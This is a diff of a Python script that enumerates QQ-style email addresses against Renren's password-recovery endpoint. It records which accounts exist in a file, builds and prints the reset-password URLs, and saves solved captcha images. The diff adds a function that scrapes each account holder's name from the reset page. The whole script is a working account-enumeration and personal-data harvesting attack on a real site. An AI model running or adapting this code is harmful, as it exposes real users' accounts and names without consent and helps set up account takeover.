@@ -10,9 +10,16 @@ from PIL import Image
 
 # 请注意，遇到未知会返回response.text结果
 
-startnum = 1571907
+def get_resname(url):
+    nre = requests.get(url)
+    soup = BeautifulSoup(nre.text, "lxml")
+    listofrsp = soup.find_all("p")
+    resname = re.search('title=".*?>', str(listofrsp))
+    return resname.group()
 
-while startnum < 1580001:  # 1570272 1580001
+startnum = 1574501
+
+while startnum < 1580001:  # 1570272  1580001
     # 初始化
     s = requests.session()
     account = startnum
@@ -79,24 +86,18 @@ while startnum < 1580001:  # 1570272 1580001
     # 发送表单并处理结果
     response2 = s.post("https://safe.renren.com/standalone/findpwd/inputaccount", data=payload, headers=headers)
     result = re.search('"code".*?(\d)', response2.text)
+    s.close()
     if result.group() == '"code":0':  # 记录成功
         with open("1.txt", "a") as rwf:
             rwf.write(str(account) + "66@qq.com\n")
-        '''r2cont = response2.content
+        r2cont = response2.content
         nurl1 = re.search('\?.*(",)', str(r2cont))
         nurl2 = re.sub('["]', '', nurl1.group())
         nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2
-        print(nameurl)
-        nre = s.get(nameurl)
-        soup2 = BeautifulSoup(nre.text, "lxml")
-        listofrsp = soup2.find_all("p")
-        print(listofrsp)
-        for i in listofrsp:
-            if i["class"] == "name":
-                namedl = i["title"]
+        '''resname = get_resname(nameurl)
         with open("name.txt", "a") as rwf:
-            rwf.write(namedl+"\n")'''
-        print("记录成功")
+            rwf.write(str(account) + "66@qq.com" + resname + "\n")'''
+        print(nameurl+"\n"+"记录成功"+str(account) + "66@qq.com")
         with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
             wf.write(capimg.content)
     elif result.group() == '"code":5':  # 验证码错误，账号不存在，账号封禁
